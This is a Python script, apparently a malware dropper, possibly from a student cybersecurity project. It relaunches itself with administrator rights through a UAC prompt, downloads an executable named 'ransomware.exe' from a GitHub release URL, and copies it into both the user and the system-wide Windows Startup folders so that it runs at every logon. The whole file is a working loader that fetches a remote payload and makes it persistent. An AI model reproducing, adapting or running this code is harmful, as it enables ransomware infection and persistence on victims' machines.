import os
import sys
import shutil
import ctypes

# 1. Import your custom download function from download_file.py
# (This assumes download_file.py is in the same directory or bundled by PyInstaller)
from download_file import download_file

# ── PYINSTALLER DIRECTORY FIX ─────────────────────────────────────────────────
if getattr(sys, 'frozen', False):
    SCRIPT_DIR = os.path.dirname(sys.executable)
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
# ──────────────────────────────────────────────────────────────────────────────

# Configuration Parameters
DOWNLOAD_URL = "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/download/v1.0.17/ransomware.exe"  # Replace with your actual URL
FILENAME = "monoukfile.exe"
SHORTCUT_NAME = "monoukfile.exe"
BAT_SOURCE_PATH = os.path.join(SCRIPT_DIR, FILENAME)

STARTUP_FOLDERS = [
    # User-level Startup folder
    os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
    # System-wide Startup folder (Requires Admin)
    os.path.join(os.environ.get("PROGRAMDATA", r"C:\ProgramData"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
]

def is_elevated() -> bool:
    """Checks if the script is currently running with Administrator privileges."""
    try: 
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception: 
        return False

def relaunch_as_admin():
    """Relaunches the current script or compiled executable with an UAC prompt."""
    if getattr(sys, 'frozen', False):
        executable = sys.executable
        params = ""
    else:
        executable = sys.executable
        params = f'"{os.path.abspath(__file__)}"'
        
    ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, params, None, 1)
    sys.exit()

if __name__ == "__main__":
    # 1. Enforce Admin access up front so writing to ProgramData succeeds
    if not is_elevated():
        print("Administrative privileges required. Prompting for elevation...")
        relaunch_as_admin()

    print("=== Downloading Payload File ===")
    # 2. Fetch the batch file over the web using your modular function
    download_success = download_file(DOWNLOAD_URL, BAT_SOURCE_PATH)
    
    if not download_success:
        sys.exit("[FATAL ERROR] Pipeline terminated because the file download failed.")

    print("\n=== Deploying to Startup Folders ===")
    # 3. Copy the fetched asset to target system locations
    for folder in STARTUP_FOLDERS:
        if not os.path.isdir(folder):
            print(f"[SKIP] Target directory does not exist: {folder}")
            continue
            
        destination = os.path.join(folder, SHORTCUT_NAME)
        try:
            shutil.copy2(BAT_SOURCE_PATH, destination)
            print(f"[OK] Installed -> {destination}")
        except Exception as e:
            print(f"[ERROR] Failed copying to {folder}: {e}")

    print("\nProcess finished successfully.")
